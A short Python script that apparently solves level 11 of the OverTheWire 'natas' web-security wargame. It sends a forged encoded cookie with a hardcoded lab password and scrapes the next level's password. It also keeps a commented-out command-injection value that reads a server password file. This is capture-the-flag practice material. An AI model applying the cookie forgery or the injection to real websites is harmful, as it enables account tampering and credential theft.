#!/usr/bin/python3 
# -*- coding: utf-8 -*-
import requests
import re
from html import unescape
import urllib
import base64
# write with binary data
# with open('natas11.html', 'wb') as out:
with open('natas11.html', 'w+') as out:
    username = 'natas11'
    password = 'U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK'
    
    url='http://%s.natas.labs.overthewire.org' % username
    
    s = requests.Session()
    # r = s.get(url+'/index-source.html', auth= (username, password))
    
    # r = s.post(url, data = {"needle":". /etc/natas_webpass/natas10 #","submit" : "submit"}, auth= (username, password))
    
    #way transmit cookies 1
    # r = s.get(url, auth= (username, password), cookies = {'data':'ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'})
    #way transmit cookies 2
    cookies = {'data':'ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK'}
    r = s.get(url, auth= (username, password), cookies = cookies)

    content = r.text
    # out.write(content)
    # out.write(unescape(content))

    # # decode url & base64 
    # plaintext = base64.b64decode(urllib.parse.unquote(s.cookies['data']))
    # # decode bytes to hex
    # plaintext_plus = plaintext.hex()
    # out.write(plaintext_plus)

    

    out.write(re.findall('The password for natas12 is (.*)<br>', content)[0])